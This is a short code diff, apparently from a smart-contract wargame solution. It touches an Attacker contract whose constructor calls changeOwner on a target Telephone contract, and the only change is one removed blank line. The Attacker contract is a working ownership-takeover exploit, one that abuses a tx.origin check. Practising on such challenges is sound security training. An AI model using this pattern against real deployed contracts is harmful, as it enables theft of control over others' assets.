@@ -34,7 +34,6 @@ contract Telephone {
 pragma solidity ^0.8.0;
 
 contract Attacker {
-
     constructor(address _target){
         Telephone(_target).changeOwner(msg.sender);
     }
